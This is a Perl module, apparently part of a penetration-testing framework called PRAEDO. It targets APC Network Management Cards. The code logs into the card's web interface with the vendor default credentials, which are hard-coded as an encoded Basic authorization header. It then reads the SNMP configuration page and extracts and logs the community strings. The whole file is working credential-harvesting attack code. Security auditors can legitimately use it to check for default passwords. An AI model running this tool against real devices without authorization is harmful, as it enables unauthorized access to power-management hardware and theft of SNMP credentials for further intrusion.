# APC Network Managment Card Default Password and SNMP String Extraction 
#
#
#
######################################################
#              PRAEDO Module #MA0009                 #
#                                                    #
#                                                    #
#                Chris Teodorski                     #
#                     aka                            #
#                   __  _                            #
#      __ __ _ _ _ /  \| |__  ___ __ _ _ _  ___      #
#     / _/ _` | ' \ () | '_ \/ -_) _` | ' \(_-<      # 
#     \__\__,_|_||_\__/|_.__/\___\__,_|_||_/__/      #
#                                                    #
#                                                    #
######################################################              

package MA0009;
sub MA0009
{


# Set global variables
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


# Open output file and setup browser LWP function 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
print "\n**********Attempting to Verify default credentials on APC Network Management Card and display snmp $TARGET : JOB MA0009**********\n";
print OUTFILE "\n**********Attempting to Verify default credentials on APC Network Management Card  and display snmp $TARGET : JOB MA0009**********\n";


my $browser = LWP::UserAgent->new(timeout => 60);
$browser->default_header(Authorization=> "Basic YXBjOmFwYw==");

my $response = $browser->get("http$web://$TARGET:$PORTS/snmpcfg.htm");

my $content = $response->content;

if ($content =~ /User Name\/Password is invalid/)
{
	print "The module failed. The username and password is not the default\n";
	print OUTFILE "The module failed. The username and password is not the default\n";
}
else	
{

	my $html = HTML::TagParser->new($content);
	my @list = $html->getElementsByTagName( "input");

	foreach my $elem(@list)
		{
		  my $text1 = $elem->getAttribute("name");
		  my $text2 = $elem->getAttribute("value");
	
			if ($text1 =~ /i1accessControlCommunity/)
			{
			 print "SUCCESS : SNMP Community String Found: "; 
			 print $text2 . "\n";
			 
			 print OUTFILE "SUCCESS : SNMP Community String Found: ";
                         print OUTFILE $text2 . "\n";

			}
		}
			



}
close(OUTFILE);
}
1;
